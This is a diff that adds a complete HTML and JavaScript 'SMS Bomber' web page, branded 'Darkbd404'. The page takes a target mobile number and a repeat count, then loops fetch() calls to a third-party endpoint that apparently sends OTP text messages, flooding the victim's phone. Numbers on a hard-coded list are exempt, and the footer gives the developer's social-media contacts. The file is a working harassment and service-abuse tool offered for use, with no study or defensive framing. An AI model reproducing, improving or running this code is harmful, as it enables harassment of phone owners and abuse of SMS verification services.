@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SMS Bomber</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            background-size: 400% 400%;
+            animation: gradientBG 15s ease infinite;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            padding: 20px;
+            color: white;
+            overflow: hidden;
+        }
+
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .header {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 20px;
+            animation: fadeIn 1s ease-in;
+        }
+
+        .header img {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            margin-bottom: 5px;
+        }
+
+        .header h1 {
+            font-size: 28px;
+            margin: 0;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .form-container {
+            text-align: center;
+            animation: slideUp 0.8s ease-out;
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        label {
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #fff;
+            font-size: 18px;
+            text-shadow: 0 0 5px rgba(255, 255, 255, 0.8);
+        }
+
+        input {
+            padding: 14px;
+            margin-bottom: 15px;
+            border: 2px solid transparent;
+            border-radius: 30px;
+            width: 260px;
+            font-size: 18px;
+            transition: all 0.4s ease;
+            background: rgba(255, 255, 255, 0.15);
+            color: white;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+        }
+
+        input::placeholder {
+            color: #ddd;
+            font-style: italic;
+            font-size: 16px;
+        }
+
+        input:focus {
+            border-color: #4CAF50;
+            background: rgba(255, 255, 255, 0.25);
+            box-shadow: 0 0 15px rgba(76, 175, 80, 0.6);
+            transform: scale(1.05);
+        }
+
+        button {
+            padding: 14px 40px;
+            background: linear-gradient(45deg, #4CAF50, #388E3C);
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: all 0.4s ease;
+            box-shadow: 0 5px 20px rgba(76, 175, 80, 0.6);
+            position: relative;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+
+        button::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            background: rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            transform: translate(-50%, -50%);
+            transition: width 0.6s ease, height 0.6s ease;
+        }
+
+        button:hover:not(:disabled)::before {
+            width: 300px;
+            height: 300px;
+        }
+
+        button:hover:not(:disabled) {
+            transform: translateY(-4px) scale(1.05);
+            box-shadow: 0 10px 25px rgba(76, 175, 80, 0.8);
+        }
+
+        button:disabled {
+            background: #aaa;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .progress-circle {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            margin: 20px auto;
+            display: none;
+        }
+
+        .progress-circle svg {
+            transform: rotate(-90deg);
+        }
+
+        .progress-circle circle {
+            fill: none;
+            stroke: #FF0000;
+            stroke-width: 12;
+            stroke-dasharray: 339;
+            stroke-dashoffset: 339;
+            transition: stroke-dashoffset 0.5s ease, stroke 0.5s ease;
+        }
+
+        .progress-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 24px;
+            font-weight: bold;
+            color: white;
+            font-family: 'Digital-7', monospace; /* Digital timer font */
+        }
+
+        #result {
+            margin-top: 15px;
+            font-size: 18px;
+            font-weight: bold;
+            animation: fadeIn 0.5s ease;
+        }
+
+        #apiCount {
+            margin-top: 10px;
+            font-size: 14px;
+        }
+
+        .footer {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            animation: fadeIn 1s ease-in;
+            margin-top: 10px;
+        }
+
+        .footer p {
+            margin: 5px 0;
+            font-size: 14px;
+            text-shadow: 0 0 5px rgba(255, 255, 255, 0.8);
+        }
+
+        .footer .contact-links {
+            display: flex;
+            align-items: center;
+        }
+
+        .footer a {
+            margin: 0 8px;
+            color: white;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            transition: transform 0.3s ease;
+            font-size: 14px;
+            text-shadow: 0 0 5px rgba(255, 255, 255, 0.8);
+        }
+
+        .footer a:hover {
+            transform: scale(1.15);
+        }
+
+        .footer img {
+            width: 24px;
+            height: 24px;
+            margin-right: 5px;
+        }
+
+        /* Position Changeable Classes */
+        .position-top { order: 1; }
+        .position-middle { order: 2; }
+        .position-bottom { order: 3; }
+    </style>
+    <!-- Digital Font for Timer -->
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="header position-top">
+        <img src="https://i.postimg.cc/qv3kJp2X/n6-T8-GRbk8eo6v9-Y4-generated-image.jpg" alt="Logo">
+        <h1>Darkbd404 SMS Bomber</h1>
+    </div>
+    <div class="form-container position-middle">
+        <form id="smsForm">
+            <label for="mobile">Enter Your Mobile Number</label>
+            <input type="text" id="mobile" name="mobile" placeholder="e.g., 01712345678">
+            <label for="otpLimit">Set OTP, Limit</label>
+            <input type="number" id="otpLimit" name="otpLimit" placeholder="e.g., 10" min="1">
+            <button type="submit">Start Bombing!</button>
+        </form>
+        <div class="progress-circle" id="progressCircle">
+            <svg width="120" height="120">
+                <circle cx="60" cy="60" r="54"></circle>
+            </svg>
+            <div class="progress-text" id="countdown">120</div>
+        </div>
+        <div id="result"></div>
+        <div id="apiCount">API Requests Completed: 0 / 0</div>
+    </div>
+    <div class="footer position-bottom">
+        <p>Developer Contact</p>
+        <div class="contact-links">
+            <a href="https://www.facebook.com/dark.king45" target="_blank">
+                <img src="https://img.icons8.com/color/48/000000/facebook-new.png" alt="Facebook"> Facebook
+            </a>
+            <a href="https://m.me/dark.king45" target="_blank">
+                <img src="https://img.icons8.com/color/48/000000/facebook-messenger--v1.png" alt="Messenger"> Messenger
+            </a>
+            <a href="https://t.me/Darknet_Team410" target="_blank">
+                <img src="https://img.icons8.com/color/48/000000/telegram-app.png" alt="Telegram"> Telegram
+            </a>
+        </div>
+    </div>
+    <script>
+        const restrictedNumbers = ['01642324285', '01620230864', '01788578297', '01872972862', '01576721736'];
+        const apiEndpoints = [
+            'https://mohammadahad.com/ahad/main.php?num=',
+            'https://mohammadahad.com/ahad/main.php?num=',
+        ];
+
+        document.getElementById('smsForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
+
+            const mobile = document.getElementById('mobile').value.trim();
+            const otpLimit = parseInt(document.getElementById('otpLimit').value);
+            const resultDiv = document.getElementById('result');
+            const apiCountDiv = document.getElementById('apiCount');
+            const button = document.querySelector('button');
+            const progressCircle = document.getElementById('progressCircle');
+            const countdownDiv = document.getElementById('countdown');
+            const circle = progressCircle.querySelector('circle');
+
+            if (!mobile || !otpLimit || isNaN(otpLimit) || otpLimit <= 0) {
+                resultDiv.textContent = 'Please enter a valid mobile number and OTP limit';
+                return;
+            }
+
+            if (restrictedNumbers.includes(mobile)) {
+                resultDiv.textContent = 'SMS bombing impossible for this number';
+                return;
+            }
+
+            resultDiv.textContent = 'Sending SMS...';
+            button.disabled = true;
+            progressCircle.style.display = 'block';
+            let totalRequests = otpLimit * apiEndpoints.length;
+            let completedRequests = 0;
+            apiCountDiv.textContent = `API Requests Completed: 0 / ${totalRequests}`;
+
+            const totalTime = 240;
+            let timeLeft = totalTime;
+            countdownDiv.textContent = timeLeft;
+            const colors = ['#00FF00', '#00FF00', '#00FF00', '#00FF00'];
+            let colorIndex = 0;
+
+            const countdownInterval = setInterval(() => {
+                timeLeft--;
+                countdownDiv.textContent = timeLeft;
+                const progress = (totalTime - timeLeft) / totalTime;
+                const dashOffset = 339 - (339 * progress);
+                circle.style.strokeDashoffset = dashOffset;
+
+                if (timeLeft % 10 === 0 && timeLeft > 0) {
+                    colorIndex = (colorIndex + 1) % colors.length;
+                    circle.style.stroke = colors[colorIndex];
+                }
+
+                if (timeLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    resultDiv.textContent = 'SMS bombing completed';
+                    apiCountDiv.textContent = `API Requests Completed: ${otpLimit} / ${otpLimit}`;
+                    button.disabled = false;
+                    progressCircle.style.display = 'none';
+                }
+            }, 1000);
+
+            for (let i = 1; i <= otpLimit; i++) {
+                apiEndpoints.forEach(api => {
+                    setTimeout(async () => {
+                        try {
+                            const response = await fetch(`${api}${mobile}`);
+                            const data = await response.text();
+                            console.log(`Request to ${api}:`, data);
+                            completedRequests++;
+                            apiCountDiv.textContent = `API Requests Completed: ${completedRequests} / ${totalRequests}`;
+                        } catch (error) {
+                            console.error('Error:', error);
+                        }
+                    }, 1000 * i);
+                });
+            }
+        });
+    </script>
+</body>
+</html>
